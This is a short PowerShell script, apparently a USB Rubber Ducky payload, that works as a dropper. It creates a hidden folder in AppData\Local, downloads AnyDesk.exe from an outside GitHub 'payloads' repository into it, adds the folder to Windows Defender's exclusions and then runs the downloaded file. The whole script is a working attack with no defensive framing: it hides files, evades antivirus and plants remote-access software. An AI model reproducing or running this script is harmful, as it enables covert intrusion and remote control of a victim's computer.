# Get the AppData folder path for the current user
$appDataPath = [System.Environment]::GetFolderPath('LocalApplicationData')

# Define the folder path (hidden folder in AppData\Local named "Test")
$hiddenFolder = Join-Path $appDataPath "Test"

# Create the hidden folder if it doesn't already exist
if (-not (Test-Path -Path $hiddenFolder)) {
    New-Item -Path $hiddenFolder -ItemType Directory | Out-Null
    # Set the folder attribute to Hidden
    Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
    Write-Host "Hidden folder created: $hiddenFolder"
} else {
    Write-Host "Folder already exists: $hiddenFolder"
}

# URL of the file to be downloaded (replace with the actual file URL)
$fileUrl = "https://raw.githubusercontent.com/Darkhaxxor005/usbrubberducky-payloads/refs/heads/master/AnyDesk.exe"

# Define the destination file path in the hidden folder
$destinationFile = Join-Path $hiddenFolder "downloadedFile.exe"

# Download the file in the background
try {
    Invoke-WebRequest -Uri $fileUrl -OutFile $destinationFile -UseBasicParsing
    Write-Host "File downloaded to: $destinationFile"
} catch {
    Write-Host "Failed to download the file. Error: $_"
    exit 1
}

# Exclude the hidden folder from Windows Defender
Add-MpPreference -ExclusionPath $hiddenFolder
Write-Host "Folder has been successfully excluded from Windows Defender: $hiddenFolder"

# Execute the downloaded file
try {
    Start-Process -FilePath $destinationFile -NoNewWindow
    Write-Host "Downloaded file is now executing."
} catch {
    Write-Host "Failed to execute the file. Error: $_"
}
